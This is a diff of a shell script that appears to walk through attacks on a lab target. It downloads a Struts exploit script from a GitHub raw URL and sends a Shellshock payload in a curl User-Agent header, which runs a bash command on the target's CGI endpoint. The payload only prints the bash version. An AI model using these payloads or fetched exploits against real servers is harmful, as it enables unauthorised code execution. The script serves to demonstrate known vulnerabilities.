@@ -11,8 +11,7 @@ sleep 2
 
 echo -e "\e[31mDownloading struts exploit\e[0m"
 sleep 3
-wget https://www.exploit-db.com/raw/41570/
-mv index.html strutsexploit.py
+wget https://raw.githubusercontent.com/mrg5103/pythonProjects/master/strutsexploit.py
 
 echo ""
 echo ""
@@ -32,10 +31,10 @@ sleep 3
 
 echo -e "\e[36mStarting Shellshock Vulnerability\e[0m"
 echo""
-sleep 1
+sleep 2
 
 echo -e "\e[31mSending curl request with injected bash command to print version of bash running on server\e[0m"
-sleep 1
+sleep 2
 curl -A '() { :;}; echo "Content-type: text/plain"; echo; /bin/bash -c "bash --version"' http://$ipaddress:9090/cgi-bin/vulnerable
 echo""
 echo -e "\e[32;1mShellshock exploited\e[0m"
